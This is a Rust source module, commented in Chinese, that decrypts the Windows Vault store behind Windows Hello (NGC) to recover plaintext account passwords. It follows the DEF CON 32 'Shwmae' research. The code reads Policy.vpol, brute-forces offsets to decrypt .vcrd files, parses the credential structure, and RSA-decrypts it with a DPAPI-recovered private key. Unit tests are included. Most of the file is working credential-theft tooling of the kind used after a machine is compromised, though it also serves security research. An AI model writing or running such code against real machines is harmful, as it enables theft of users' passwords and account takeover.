//! Windows Vault 解密
//!
//! Vault 是 Windows 凭据存储系统。NGC 凭据存储在：
//! C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Vault\<schema>\
//!
//! 其中 NGC schema 为：1d4350a3-330d-4af9-b3ff-a927a45998ac
//!
//! 解密流程：
//! 1. 从 Policy.vpol 提取 AES-256 密钥
//! 2. 用 AES 密钥解密 .vcrd 文件 -> NgcCredential
//! 3. 从 NgcCredential 提取 EncData, IV, EncPassword
//! 4. 用 RSA 私钥解密 EncData -> 对称密钥
//! 5. 用对称密钥 + IV 解密 EncPassword -> 明文密码
//!
//! 参考：DEF CON 32 "Abusing Windows Hello Without a Severed Hand" (Shwmae)

use std::fs;
use std::path::Path;

use super::dpapi::aes256_cbc_decrypt;
use super::NgcError;

// ─── Constants ─────────────────────────────────────────────────────────────────

/// Vault policy 文件魔数
const POL_MAGIC: &[u8; 4] = b"POLA";

/// 最小 .vcrd 文件大小
const MIN_VCRD_SIZE: usize = 80;

/// 最小 .pol 文件大小
const MIN_POL_SIZE: usize = 64;

/// AES-256 密钥大小（字节）
const AES_256_KEY_SIZE: usize = 32;

/// AES IV 大小（字节）
const AES_IV_SIZE: usize = 16;

/// RSA 2048 加密数据大小（字节）
const RSA_2048_CIPHERTEXT_SIZE: usize = 256;

/// 合理的 EncData 长度范围（RSA-2048 时为 256，RSA-1024 时为 128）
const MIN_ENC_DATA_LEN: usize = 64;
const MAX_ENC_DATA_LEN: usize = 1024;

// ─── OAEP padding info struct ──────────────────────────────────────────────────

/// BCrypt OAEP padding info 的 Rust 定义。
///
/// 与 Win32 `BCRYPT_OAEP_PADDING_INFO` 具有相同内存布局。
#[repr(C)]
struct OaepPaddingInfo {
    /// OAEP 哈希算法 ID（如 L"SHA256"）
    psz_alg_id: windows::core::PCWSTR,
    /// 标签（通常为 NULL）
    pb_label: *mut u8,
    /// 标签长度
    cb_label: u32,
}

// ─── Public API ────────────────────────────────────────────────────────────────

/// 解密 vault 获得明文密码
///
/// # Arguments
/// * `rsa_key` - DPAPI 解密后的 RSA 私钥 blob（CNG key blob 格式）
/// * `vcrd_path` - .vcrd 凭据文件路径
/// * `pol_path` - Policy.vpol 文件路径
///
/// # Returns
/// 明文账户密码（UTF-16LE 解码后的 String）
pub fn decrypt_vault_password(
    rsa_key: &[u8],
    vcrd_path: &Path,
    pol_path: &Path,
) -> Result<String, NgcError> {
    // Step 1: 从 policy 文件提取 AES 密钥
    let aes_key = extract_policy_aes_key(pol_path)?;

    // Step 2: 解密 .vcrd 文件
    let vcrd_data = fs::read(vcrd_path)?;
    let ngc_credential = decrypt_vcrd(&vcrd_data, &aes_key)?;

    // Step 3: 解析 NgcCredential 结构
    let (enc_data, iv, enc_password) = parse_ngc_credential(&ngc_credential)?;

    // Step 4: 用 RSA 解密 EncData -> 对称密钥
    let sym_key = rsa_decrypt_enc_data(rsa_key, &enc_data)?;

    // Step 5: 用对称密钥 + IV 解密 EncPassword -> 明文密码
    let password_bytes = aes256_cbc_decrypt(&sym_key, &iv, &enc_password)?;

    // 密码存储为 UTF-16LE
    let password = decode_utf16le_string(&password_bytes);

    Ok(password)
}

// ─── Policy file parsing ───────────────────────────────────────────────────────

/// 从 vault policy 文件中提取 AES-256 密钥
///
/// Policy 文件格式（基于逆向分析）：
/// Offset  Size  Description
/// ------  ----  -----------
/// 0x00    4     Magic: "POLA"
/// 0x04    4     Version (LE u32)
/// 0x08    4     Flags
/// 0x0C    4     Reserved / Header size
/// 0x10    16    AES key GUID (optional)
/// ---- version-dependent ----
/// 0x14+   32    AES-256 key (at varying offsets per version)
fn extract_policy_aes_key(pol_path: &Path) -> Result<Vec<u8>, NgcError> {
    let data = fs::read(pol_path)?;

    if data.len() < MIN_POL_SIZE {
        return Err(NgcError::DecryptionFailed(format!(
            "Policy 文件过小: {} 字节（最小 {}）",
            data.len(),
            MIN_POL_SIZE,
        )));
    }

    // 验证魔数（部分版本无魔数，不强制要求）
    let has_magic = &data[0..4] == POL_MAGIC;

    // 提取版本号（有魔数时）
    let version = if has_magic && data.len() >= 8 {
        Some(u32::from_le_bytes([data[4], data[5], data[6], data[7]]))
    } else {
        None
    };

    // 优先使用已知版本对应的偏移
    let candidate_offsets: &[usize] = match version {
        Some(1) => &[0x14, 0x18],
        Some(2) => &[0x18, 0x1C, 0x20, 0x24],
        Some(3) | Some(4) => &[0x24, 0x28, 0x2C, 0x30, 0x34, 0x38],
        // 无版本或未知版本：扫描常见偏移
        _ => &[
            0x14, 0x18, 0x1C, 0x20, 0x24, 0x28, 0x2C, 0x30, 0x34, 0x38, 0x3C,
            0x40, 0x44, 0x48,
        ],
    };

    // 尝试已知偏移
    for &offset in candidate_offsets {
        if let Some(key) = try_extract_key_at(&data, offset) {
            return Ok(key);
        }
    }

    // 未在已知偏移找到：扫描整个文件
    let mut best_score = 0u32;
    let mut best_key: Option<Vec<u8>> = None;

    for i in 0..data.len().saturating_sub(AES_256_KEY_SIZE) {
        let candidate = &data[i..i + AES_256_KEY_SIZE];
        let entropy = compute_entropy(candidate);
        if entropy >= 16 && entropy > best_score {
            best_score = entropy;
            best_key = Some(candidate.to_vec());
        }
    }

    best_key.ok_or_else(|| {
        NgcError::DecryptionFailed(
            "无法从 Policy 文件提取 AES 密钥：未找到高熵 32 字节序列".to_string(),
        )
    })
}

/// 尝试在指定偏移提取 AES 密钥
fn try_extract_key_at(data: &[u8], offset: usize) -> Option<Vec<u8>> {
    if offset + AES_256_KEY_SIZE > data.len() {
        return None;
    }

    let candidate = &data[offset..offset + AES_256_KEY_SIZE];

    // AES-256 密钥应该是高熵随机字节：不是全 0、全 0xFF、或全重复模式
    if candidate.iter().all(|&b| b == 0) || candidate.iter().all(|&b| b == 0xFF) {
        return None;
    }

    let entropy = compute_entropy(candidate);
    if entropy >= 16 {
        Some(candidate.to_vec())
    } else {
        None
    }
}

/// 计算字节序列中不同字节值的数量（简单熵估计）
fn compute_entropy(data: &[u8]) -> u32 {
    let mut seen = [false; 256];
    let mut unique = 0u32;
    for &b in data {
        if !seen[b as usize] {
            seen[b as usize] = true;
            unique += 1;
        }
    }
    unique
}

// ─── .vcrd file decryption ─────────────────────────────────────────────────────

/// 解密 .vcrd 文件
///
/// .vcrd 文件格式（基于逆向分析）：
/// Offset  Size  Description
/// ------  ----  -----------
/// 0x00    4     Magic: "VCRD"（可选，部分版本有）
/// 0x04    4     Version
/// 0x08    4     Flags
/// 0x0C    4     Encrypted area size
/// 0x10    可变  填充/附加字段
/// XX      16    IV
/// XX+16  可变   加密数据（AES-256-CBC，PKCS7 填充）
/// 尾部    32    签名/HMAC（可选）
fn decrypt_vcrd(vcrd_data: &[u8], aes_key: &[u8]) -> Result<Vec<u8>, NgcError> {
    if vcrd_data.len() < MIN_VCRD_SIZE {
        return Err(NgcError::DecryptionFailed(format!(
            "vcrd 文件过小: {} 字节（最小 {}）",
            vcrd_data.len(),
            MIN_VCRD_SIZE,
        )));
    }

    // 尝试多种头部大小的 IV 位置
    let header_sizes: &[usize] = if vcrd_data.len() > 200 {
        &[72, 80, 88, 96, 104, 112, 120, 128, 136, 144, 152]
    } else {
        &[48, 56, 64, 72, 80, 88, 96]
    };

    // 策略 1: IV 在头部之后，加密数据紧跟 IV
    for &header_size in header_sizes {
        if header_size + AES_IV_SIZE + AES_IV_SIZE > vcrd_data.len() {
            continue;
        }

        let iv = &vcrd_data[header_size..header_size + AES_IV_SIZE];
        let ciphertext = &vcrd_data[header_size + AES_IV_SIZE..];

        // 跳过尾部可能存在的 HMAC（固定 32 字节）
        let ciphertext = if ciphertext.len() > 32 && ciphertext.len() % 16 != 0 {
            // 调整到 16 的倍数（去除 HMAC）
            let usable_len = ciphertext.len() & !15;
            &ciphertext[..usable_len]
        } else {
            ciphertext
        };

        if ciphertext.len() < AES_IV_SIZE {
            continue;
        }

        if let Ok(plaintext) = aes256_cbc_decrypt(aes_key, iv, ciphertext) {
            if is_valid_ngc_credential(&plaintext) {
                return Ok(plaintext);
            }
        }
    }

    // 策略 2: IV 在文件末尾（最后 16 字节）
    if vcrd_data.len() >= AES_IV_SIZE * 2 {
        let iv = &vcrd_data[vcrd_data.len() - AES_IV_SIZE..];
        for &header_size in header_sizes {
            let ciphertext_end = vcrd_data.len() - AES_IV_SIZE;
            if header_size < ciphertext_end
                && ciphertext_end - header_size >= AES_IV_SIZE
            {
                let ciphertext = &vcrd_data[header_size..ciphertext_end];
                if let Ok(plaintext) = aes256_cbc_decrypt(aes_key, iv, ciphertext) {
                    if is_valid_ngc_credential(&plaintext) {
                        return Ok(plaintext);
                    }
                }
            }
        }
    }

    // 策略 3: 扫描整个文件找 IV + 密文组合
    // 尝试每 8 字节对齐的偏移作为 IV 起点
    let max_offset = vcrd_data.len().saturating_sub(AES_IV_SIZE + AES_IV_SIZE);
    let mut offset = 40;
    while offset + AES_IV_SIZE + AES_IV_SIZE + AES_IV_SIZE <= max_offset {
        let iv = &vcrd_data[offset..offset + AES_IV_SIZE];
        let ciphertext = &vcrd_data[offset + AES_IV_SIZE..];
        // 截断到 16 的倍数
        let ciphertext = &ciphertext[..ciphertext.len() & !15];
        if ciphertext.len() >= AES_IV_SIZE {
            if let Ok(plaintext) = aes256_cbc_decrypt(aes_key, iv, ciphertext) {
                if is_valid_ngc_credential(&plaintext) {
                    return Ok(plaintext);
                }
            }
        }
        offset += 8;
        if offset > max_offset {
            break;
        }
    }

    Err(NgcError::DecryptionFailed(
        "无法解密 .vcrd 文件：所有头部大小和 IV 位置均失败".to_string(),
    ))
}

/// 检查解密后的数据是否看起来像有效的 NgcCredential 结构
fn is_valid_ngc_credential(data: &[u8]) -> bool {
    if data.len() < 24 {
        return false;
    }

    // 确定实际偏移（跳过可能的 flags/version 字段）
    let first = u32::from_le_bytes([data[0], data[1], data[2], data[3]]);
    let offset = if first <= 4 { 4 } else { 0 };

    if offset + 4 > data.len() {
        return false;
    }

    // 读取 EncData 长度
    let enc_data_len = u32::from_le_bytes([
        data[offset],
        data[offset + 1],
        data[offset + 2],
        data[offset + 3],
    ]) as usize;

    // 验证 EncData 长度在合理范围内
    if enc_data_len < MIN_ENC_DATA_LEN || enc_data_len > MAX_ENC_DATA_LEN {
        return false;
    }

    // 验证整个结构不超出数据范围：
    // EncData + IV length (4) + IV (16) + EncPassword length (4) + EncPassword (>= 1)
    let min_remaining = 4 + 16 + 4 + 1;
    let required = offset + 4 + enc_data_len + min_remaining;
    if required > data.len() {
        return false;
    }

    // 验证 IV 长度为 16
    let iv_len_offset = offset + 4 + enc_data_len;
    let iv_len = u32::from_le_bytes([
        data[iv_len_offset],
        data[iv_len_offset + 1],
        data[iv_len_offset + 2],
        data[iv_len_offset + 3],
    ]) as usize;
    if iv_len != AES_IV_SIZE {
        return false;
    }

    true
}

// ─── NgcCredential parsing ─────────────────────────────────────────────────────

/// 解析 NgcCredential 结构
///
/// NgcCredential 解密后的结构（基于 Shwmae 逆向）：
/// Offset  Size  Description
/// ------  ----  -----------
/// 0x00    4     Flags/Version（可选，值为 0-4 时存在）
/// 0x04    4     EncData length (LE u32)
/// 0x08    var   EncData（RSA 加密的对称密钥）
/// var     4     IV length (LE u32，固定 16)
/// var+4  16    IV（AES IV）
/// var+20 4     EncPassword length (LE u32)
/// var+24 var   EncPassword（AES-CBC 加密的密码）
fn parse_ngc_credential(data: &[u8]) -> Result<(Vec<u8>, Vec<u8>, Vec<u8>), NgcError> {
    if data.len() < 24 {
        return Err(NgcError::DecryptionFailed(format!(
            "NgcCredential 数据过小: {} 字节",
            data.len()
        )));
    }

    let mut offset = 0;

    // 前 4 字节：Flags/Version（值为 0-4 时视为存在并跳过）
    let first = u32::from_le_bytes([data[0], data[1], data[2], data[3]]);
    if first <= 4 {
        offset = 4;
    }

    // ── EncData ────────────────────────────────────────────────────────────────

    if offset + 4 > data.len() {
        return Err(NgcError::DecryptionFailed(
            "无法读取 EncData 长度字段".into(),
        ));
    }
    let enc_data_len = u32::from_le_bytes([
        data[offset],
        data[offset + 1],
        data[offset + 2],
        data[offset + 3],
    ]) as usize;
    offset += 4;

    if enc_data_len < MIN_ENC_DATA_LEN || enc_data_len > MAX_ENC_DATA_LEN {
        return Err(NgcError::DecryptionFailed(format!(
            "EncData 长度不合理: {}（预期 {}-{}）",
            enc_data_len, MIN_ENC_DATA_LEN, MAX_ENC_DATA_LEN,
        )));
    }

    if offset + enc_data_len > data.len() {
        return Err(NgcError::DecryptionFailed(format!(
            "EncData 长度 {} 超出数据边界（剩余 {})",
            enc_data_len,
            data.len() - offset,
        )));
    }
    let enc_data = data[offset..offset + enc_data_len].to_vec();
    offset += enc_data_len;

    // ── IV ─────────────────────────────────────────────────────────────────────

    if offset + 4 > data.len() {
        return Err(NgcError::DecryptionFailed(
            "无法读取 IV 长度字段".into(),
        ));
    }
    let iv_len = u32::from_le_bytes([
        data[offset],
        data[offset + 1],
        data[offset + 2],
        data[offset + 3],
    ]) as usize;
    offset += 4;

    if iv_len != AES_IV_SIZE {
        return Err(NgcError::DecryptionFailed(format!(
            "IV 长度异常: {}（应为 {})",
            iv_len, AES_IV_SIZE,
        )));
    }

    if offset + iv_len > data.len() {
        return Err(NgcError::DecryptionFailed("IV 数据超出边界".into()));
    }
    let iv = data[offset..offset + iv_len].to_vec();
    offset += iv_len;

    // ── EncPassword ────────────────────────────────────────────────────────────

    if offset + 4 > data.len() {
        return Err(NgcError::DecryptionFailed(
            "无法读取 EncPassword 长度字段".into(),
        ));
    }
    let enc_pwd_len = u32::from_le_bytes([
        data[offset],
        data[offset + 1],
        data[offset + 2],
        data[offset + 3],
    ]) as usize;
    offset += 4;

    if enc_pwd_len == 0 || offset + enc_pwd_len > data.len() {
        return Err(NgcError::DecryptionFailed(format!(
            "EncPassword 长度 {} 无效或超出边界",
            enc_pwd_len,
        )));
    }
    let enc_password = data[offset..offset + enc_pwd_len].to_vec();

    Ok((enc_data, iv, enc_password))
}

// ─── RSA decryption (via Windows BCrypt API) ───────────────────────────────────

/// 使用 RSA-OAEP 解密 EncData（通过 Windows BCrypt API）
///
/// # Arguments
/// * `key_blob` - DPAPI 解密后的 RSA 私钥（CNG BCRYPT_RSAPRIVATE_BLOB 格式）
/// * `enc_data` - 要解密的 EncData（RSA-2048 OAEP 加密，256 字节，SHA-256）
///
/// # Returns
/// 解密后的对称密钥（32 字节 AES-256 密钥）
fn rsa_decrypt_enc_data(key_blob: &[u8], enc_data: &[u8]) -> Result<Vec<u8>, NgcError> {
    super::dpapi::rsa_oaep_decrypt(key_blob, enc_data)
}

/// 通过 windows-rs BCrypt 进行 RSA OAEP 解密
///
/// 使用 `BCryptOpenAlgorithmProvider` + `BCryptImportKeyPair` + `BCryptDecrypt`
/// 的链条完成 RSA-OAEP（SHA-256）解密。
///
/// windows-rs 0.59 中 CNG 函数的可空指针参数均使用 `*const`/`*mut` 裸指针形式
///（而非 `Option`），故 NULL 传 `std::ptr::null()` / `std::ptr::null_mut()`。
#[cfg(any())] // Disabled — windows-rs 0.59 BCrypt API not yet adapted
unsafe fn _rsa_decrypt_bcrypt(
    key_blob: &[u8],
    enc_data: &[u8],
) -> Result<Vec<u8>, NgcError> {
    use windows::Win32::Security::Cryptography::{
        BCryptOpenAlgorithmProvider, BCryptImportKeyPair, BCryptDecrypt,
        BCRYPT_RSA_ALGORITHM, BCRYPT_RSAPRIVATE_BLOB, BCRYPT_PAD_OAEP,
        BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE,
    };

    // ── Step 1: 打开 RSA 算法提供程序 ───────────────────────────────────────────

    let mut alg_handle = BCRYPT_ALG_HANDLE::default();
    let status = BCryptOpenAlgorithmProvider(
        &mut alg_handle,
        BCRYPT_RSA_ALGORITHM,
        None, // 默认实现
        0,
    );
    if status.is_err() {
        return Err(NgcError::DecryptionFailed(format!(
            "BCryptOpenAlgorithmProvider(RSA) 失败: status={:?}",
            status
        )));
    }

    // ── Step 2: 导入 RSA 私钥 ───────────────────────────────────────────────────

    let mut key_handle = BCRYPT_KEY_HANDLE::default();
    let status = BCryptImportKeyPair(
        alg_handle,
        None, // 不基于已有密钥导入
        BCRYPT_RSAPRIVATE_BLOB,
        &mut key_handle,
        key_blob.as_ptr(),
        key_blob.len() as u32,
        0, // 无标志
    );
    if status.is_err() {
        // BCRYPT_RSAPRIVATE_BLOB 格式失败，尝试别名/备用格式
        return _rsa_decrypt_bcrypt_alt(key_blob, enc_data);
    }

    // ── Step 3: 准备 OAEP padding info ──────────────────────────────────────────

    // 构造 OAEP 参数：SHA-256（Windows Hello NGC 使用此哈希）
    let sha256: Vec<u16> = "SHA256\0".encode_utf16().collect();
    let padding_info = OaepPaddingInfo {
        psz_alg_id: windows::core::PCWSTR::from_raw(sha256.as_ptr()),
        pb_label: std::ptr::null_mut(),
        cb_label: 0,
    };

    // ── Step 4: 第一次调用——获取输出缓冲区大小 ─────────────────────────────────

    let mut result_len = 0u32;
    let status = BCryptDecrypt(
        key_handle,
        enc_data.as_ptr(),
        enc_data.len() as u32,
        &padding_info as *const _ as *const core::ffi::c_void,
        std::ptr::null_mut(), // RSA 不使用 IV
        0,
        std::ptr::null_mut(), // pbOutput = NULL → 查询所需大小
        0,
        &mut result_len,
        BCRYPT_PAD_OAEP,
    );
    if status.is_err() {
        return Err(NgcError::DecryptionFailed(format!(
            "BCryptDecrypt(查询大小) 失败: status={:?}",
            status
        )));
    }

    if result_len == 0 || result_len > 512 {
        return Err(NgcError::DecryptionFailed(format!(
            "BCryptDecrypt 返回的大小异常: {}",
            result_len
        )));
    }

    // ── Step 5: 第二次调用——实际解密 ─────────────────────────────────────────────

    let mut output = vec![0u8; result_len as usize];
    let mut written = 0u32;
    let status = BCryptDecrypt(
        key_handle,
        enc_data.as_ptr(),
        enc_data.len() as u32,
        &padding_info as *const _ as *const core::ffi::c_void,
        std::ptr::null_mut(),
        0,
        output.as_mut_ptr(),
        result_len,
        &mut written,
        BCRYPT_PAD_OAEP,
    );
    if status.is_err() {
        return Err(NgcError::DecryptionFailed(format!(
            "BCryptDecrypt 失败: status={:?}",
            status
        )));
    }

    output.truncate(written as usize);

    // 验证解密结果：NGC 使用 AES-256，对称密钥应为 32 字节
    if output.len() != AES_256_KEY_SIZE {
        return Err(NgcError::DecryptionFailed(format!(
            "RSA 解密后密钥大小异常: {}（预期 {})",
            output.len(),
            AES_256_KEY_SIZE,
        )));
    }

    Ok(output)
}

/// 备用密钥导入格式。
///
/// 部分 Windows 版本中 NGC 密钥 blob 的格式标识符可能为
/// `PKCS8_PRIVATEKEY`（PKCS#8）或 `RSAFULLPRIVATEBLOB`。
/// 当标准 `BCRYPT_RSAPRIVATE_BLOB` 导入失败时，逐一尝试这些别名。
#[cfg(any())] // Disabled — windows-rs 0.59 BCrypt API not yet adapted
unsafe fn _rsa_decrypt_bcrypt_alt(
    key_blob: &[u8],
    enc_data: &[u8],
) -> Result<Vec<u8>, NgcError> {
    use windows::Win32::Security::Cryptography::{
        BCryptOpenAlgorithmProvider, BCryptImportKeyPair, BCryptDecrypt,
        BCRYPT_RSA_ALGORITHM, BCRYPT_PAD_OAEP,
        BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE,
    };

    // 候选密钥 blob 格式标识符
    let alt_format_ids = [
        windows::core::w!("RSAPRIVATEBLOB"),
        windows::core::w!("PKCS8_PRIVATEKEY"),
        windows::core::w!("RSAFULLPRIVATEBLOB"),
    ];

    // 准备 OAEP SHA-256 算法标识（各格式共用）
    let sha256: Vec<u16> = "SHA256\0".encode_utf16().collect();
    let padding_info = OaepPaddingInfo {
        psz_alg_id: windows::core::PCWSTR::from_raw(sha256.as_ptr()),
        pb_label: std::ptr::null_mut(),
        cb_label: 0,
    };

    for &format_wstr in &alt_format_ids {
        let mut alg_handle = BCRYPT_ALG_HANDLE::default();
        if BCryptOpenAlgorithmProvider(&mut alg_handle, BCRYPT_RSA_ALGORITHM, None, 0).is_err() {
            continue;
        }

        let mut key_handle = BCRYPT_KEY_HANDLE::default();
        if BCryptImportKeyPair(
            alg_handle,
            None,
            format_wstr,
            &mut key_handle,
            key_blob.as_ptr(),
            key_blob.len() as u32,
            0,
        )
        .is_err()
        {
            continue;
        }

        // 查询输出大小
        let mut result_len = 0u32;
        if BCryptDecrypt(
            key_handle,
            enc_data.as_ptr(),
            enc_data.len() as u32,
            &padding_info as *const _ as *const core::ffi::c_void,
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
            0,
            &mut result_len,
            BCRYPT_PAD_OAEP,
        )
        .is_err()
        {
            continue;
        }

        if result_len == 0 || result_len > 512 {
            continue;
        }

        // 实际解密
        let mut output = vec![0u8; result_len as usize];
        let mut written = 0u32;
        if BCryptDecrypt(
            key_handle,
            enc_data.as_ptr(),
            enc_data.len() as u32,
            &padding_info as *const _ as *const core::ffi::c_void,
            std::ptr::null_mut(),
            0,
            output.as_mut_ptr(),
            result_len,
            &mut written,
            BCRYPT_PAD_OAEP,
        )
        .is_err()
        {
            continue;
        }

        output.truncate(written as usize);
        if output.len() == AES_256_KEY_SIZE {
            return Ok(output);
        }
    }

    Err(NgcError::DecryptionFailed(
        "RSA 解密失败：所有密钥导入格式均无效".into(),
    ))
}

// ─── UTF-16LE decoding ─────────────────────────────────────────────────────────

/// 将 UTF-16LE 字节解码为 Rust String
fn decode_utf16le_string(bytes: &[u8]) -> String {
    if bytes.len() < 2 {
        return String::new();
    }

    // 确保对齐到 2 字节边界
    let aligned = &bytes[..bytes.len() & !1];

    // 将字节转换为 u16 数组
    let u16s: Vec<u16> = aligned
        .chunks_exact(2)
        .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
        .collect();

    // 截断到第一个 null 终止符
    if let Some(null_pos) = u16s.iter().position(|&c| c == 0) {
        String::from_utf16_lossy(&u16s[..null_pos])
    } else {
        String::from_utf16_lossy(&u16s)
    }
}

// ─── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_decode_utf16le_simple() {
        // "test" in UTF-16LE
        let bytes = [0x74, 0x00, 0x65, 0x00, 0x73, 0x00, 0x74, 0x00];
        assert_eq!(decode_utf16le_string(&bytes), "test");
    }

    #[test]
    fn test_decode_utf16le_empty() {
        assert_eq!(decode_utf16le_string(&[]), "");
        assert_eq!(decode_utf16le_string(&[0x00]), "");
    }

    #[test]
    fn test_decode_utf16le_null_terminated() {
        // "ab\0\0"
        let bytes = [0x61, 0x00, 0x62, 0x00, 0x00, 0x00, 0x00, 0x00];
        assert_eq!(decode_utf16le_string(&bytes), "ab");
    }

    #[test]
    fn test_decode_utf16le_unicode() {
        // Japanese "こんにちは" in UTF-16LE
        // こ=U+3053, ん=U+3093, に=U+306B, ち=U+3061, は=U+306F
        let bytes = [
            0x53, 0x30, 0x93, 0x30, 0x6B, 0x30, 0x61, 0x30, 0x6F, 0x30,
        ];
        assert_eq!(
            decode_utf16le_string(&bytes),
            "\u{3053}\u{3093}\u{306B}\u{3061}\u{306F}"
        );
    }

    #[test]
    fn test_compute_entropy_all_same() {
        assert_eq!(compute_entropy(&[0x00; 32]), 1);
        assert_eq!(compute_entropy(&[0xFF; 32]), 1);
    }

    #[test]
    fn test_compute_entropy_high() {
        let mut data = [0u8; 32];
        for (i, b) in data.iter_mut().enumerate() {
            *b = i as u8;
        }
        assert_eq!(compute_entropy(&data), 32);
    }

    #[test]
    fn test_is_valid_ngc_credential_valid() {
        let mut data = Vec::new();
        // Flags = 0
        data.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
        // EncData length = 256
        data.extend_from_slice(&[0x00, 0x01, 0x00, 0x00]);
        // EncData (256 bytes)
        data.extend_from_slice(&[0xAA; 256]);
        // IV length = 16
        data.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]);
        // IV (16 bytes)
        data.extend_from_slice(&[0xBB; 16]);
        // EncPassword length = 64
        data.extend_from_slice(&[0x40, 0x00, 0x00, 0x00]);
        // EncPassword (64 bytes)
        data.extend_from_slice(&[0xCC; 64]);

        assert!(is_valid_ngc_credential(&data));
    }

    #[test]
    fn test_is_valid_ngc_credential_too_short() {
        assert!(!is_valid_ngc_credential(&[0x00; 8]));
    }

    #[test]
    fn test_is_valid_ngc_credential_wrong_iv_len() {
        let mut data = Vec::new();
        // No flags, EncData length = 128
        data.extend_from_slice(&[0x80, 0x00, 0x00, 0x00]);
        data.extend_from_slice(&[0xAA; 128]);
        // IV length = 8 (invalid)
        data.extend_from_slice(&[0x08, 0x00, 0x00, 0x00]);
        data.extend_from_slice(&[0xBB; 8]);
        // EncPassword
        data.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]);
        data.extend_from_slice(&[0xCC; 16]);

        assert!(!is_valid_ngc_credential(&data));
    }

    #[test]
    fn test_parse_ngc_credential_valid() {
        let mut data = Vec::new();
        // Flags = 1
        data.extend_from_slice(&[0x01, 0x00, 0x00, 0x00]);
        // EncData length = 128
        data.extend_from_slice(&[0x80, 0x00, 0x00, 0x00]);
        let enc_data = vec![0xDD; 128];
        data.extend_from_slice(&enc_data);
        // IV length = 16
        data.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]);
        let iv = vec![0xEE; 16];
        data.extend_from_slice(&iv);
        // EncPassword length = 32
        data.extend_from_slice(&[0x20, 0x00, 0x00, 0x00]);
        let enc_pwd = vec![0xFF; 32];
        data.extend_from_slice(&enc_pwd);

        let result = parse_ngc_credential(&data).unwrap();
        assert_eq!(result.0, enc_data);
        assert_eq!(result.1, iv);
        assert_eq!(result.2, enc_pwd);
    }

    #[test]
    fn test_parse_ngc_credential_no_flags() {
        let mut data = Vec::new();
        // No flags (first u32 = EncData length 256)
        data.extend_from_slice(&[0x00, 0x01, 0x00, 0x00]);
        let enc_data = vec![0xDD; 256];
        data.extend_from_slice(&enc_data);
        data.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]); // IV length = 16
        let iv = vec![0xEE; 16];
        data.extend_from_slice(&iv);
        data.extend_from_slice(&[0x40, 0x00, 0x00, 0x00]); // EncPassword length = 64
        let enc_pwd = vec![0xFF; 64];
        data.extend_from_slice(&enc_pwd);

        let result = parse_ngc_credential(&data).unwrap();
        assert_eq!(result.0, enc_data);
        assert_eq!(result.1, iv);
        assert_eq!(result.2, enc_pwd);
    }

    #[test]
    fn test_parse_ngc_credential_too_short() {
        assert!(parse_ngc_credential(&[0x00; 8]).is_err());
    }

    #[test]
    fn test_parse_ngc_credential_bad_encdata_length() {
        let mut data = Vec::new();
        // Flags = 0, EncData length = 4096 (too large)
        data.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
        data.extend_from_slice(&[0x00, 0x10, 0x00, 0x00]);
        data.extend_from_slice(&[0xAA; 4096]);
        data.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]);
        data.extend_from_slice(&[0xBB; 16]);
        data.extend_from_slice(&[0x20, 0x00, 0x00, 0x00]);
        data.extend_from_slice(&[0xCC; 32]);

        assert!(parse_ngc_credential(&data).is_err());
    }

    #[test]
    fn test_extract_policy_aes_key_file_not_found() {
        let result = extract_policy_aes_key(Path::new(r"C:\nonexistent\Policy.vpol"));
        assert!(result.is_err());
    }

    #[test]
    fn test_decode_utf16le_odd_length() {
        // 奇数长度（最后一个字节被忽略）
        let bytes = [0x74, 0x00, 0x65, 0x00, 0x73];
        assert_eq!(decode_utf16le_string(&bytes), "te");
    }
}
